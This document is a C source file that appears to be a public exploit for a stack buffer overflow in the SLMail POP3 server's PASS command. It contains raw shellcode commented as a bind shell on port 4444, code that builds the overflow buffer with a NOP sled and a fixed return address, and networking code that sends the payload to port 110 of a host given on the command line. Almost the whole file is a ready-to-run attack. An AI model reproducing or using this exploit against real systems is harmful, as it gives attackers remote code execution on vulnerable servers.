/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov ????-?????
???????????????? 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444
unsigned char shellcode[] =
"\xb8\xe6\x01\x8e\xd3\xda\xce\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x4f\x31\x42\x14\x03\x42\x14\x83\xc2\x04\x04\xf4\x72"
"\x3b\x41\xf7\x8a\xbc\x31\x71\x6f\x8d\x63\xe5\xfb\xbc\xb3"
"\x6d\xa9\x4c\x38\x23\x5a\xc6\x4c\xec\x6d\x6f\xfa\xca\x40"
"\x70\xcb\xd2\x0f\xb2\x4a\xaf\x4d\xe7\xac\x8e\x9d\xfa\xad"
"\xd7\xc0\xf5\xff\x80\x8f\xa4\xef\xa5\xd2\x74\x0e\x6a\x59"
"\xc4\x68\x0f\x9e\xb1\xc2\x0e\xcf\x6a\x59\x58\xf7\x01\x05"
"\x79\x06\xc5\x56\x45\x41\x62\xac\x3d\x50\xa2\xfd\xbe\x62"
"\x8a\x51\x81\x4a\x07\xa8\xc5\x6d\xf8\xdf\x3d\x8e\x85\xe7"
"\x85\xec\x51\x62\x18\x56\x11\xd4\xf8\x66\xf6\x82\x8b\x65"
"\xb3\xc1\xd4\x69\x42\x06\x6f\x95\xcf\xa9\xa0\x1f\x8b\x8d"
"\x64\x7b\x4f\xac\x3d\x21\x3e\xd1\x5e\x8d\x9f\x77\x14\x3c"
"\xcb\x01\x77\x29\x38\x3f\x88\xa9\x56\x48\xfb\x9b\xf9\xe2"
"\x93\x97\x72\x2c\x63\xd7\xa8\x88\xfb\x26\x53\xe8\xd2\xec"
"\x07\xb8\x4c\xc4\x27\x53\x8d\xe9\xfd\xf3\xdd\x45\xae\xb3"
"\x8d\x25\x1e\x5b\xc4\xa9\x41\x7b\xe7\x63\xf4\xbc\x70\x4c"
"\xaf\x5c\x16\x24\xb2\x60\x3e\x21\x3b\x86\x54\x59\x6a\x11"
"\xc1\xc0\x37\xe9\x70\x0c\xe2\x79\x10\x9f\x69\x79\x5f\xbc"
"\x25\x2e\x08\x72\x3c\xba\xa4\x2d\x96\xd8\x34\xab\xd1\x58"
"\xe3\x08\xdf\x61\x66\x34\xfb\x71\xbe\xb5\x47\x25\x6e\xe0"
"\x11\x93\xc8\x5a\xd0\x4d\x83\x31\xba\x19\x52\x7a\x7d\x5f"
"\x5b\x57\x0b\xbf\xea\x0e\x4a\xc0\xc3\xc6\x5a\xb9\x39\x77"
"\xa4\x10\xfa\x97\x47\xb0\xf7\x3f\xde\x51\xba\x5d\xe1\x8c"
"\xf9\x5b\x62\x24\x82\x9f\x7a\x4d\x87\xe4\x3c\xbe\xf5\x75"
"\xa9\xc0\xaa\x76\xf8";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[2959];
      char buf[2959];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 2959);
      memset(evil, 0x41, 2959);
      ptr = &evil;
      // 652*4 = 2608
      ptr = ptr + 652; // 2608
      memcpy(ptr, &nopsled, 12);
      ptr = ptr + 3;
      memcpy(ptr, &shellcode, 317);
      // assign the return address
      *(long*)&evil[2606] = 0x5F4A358F;

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 9876...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
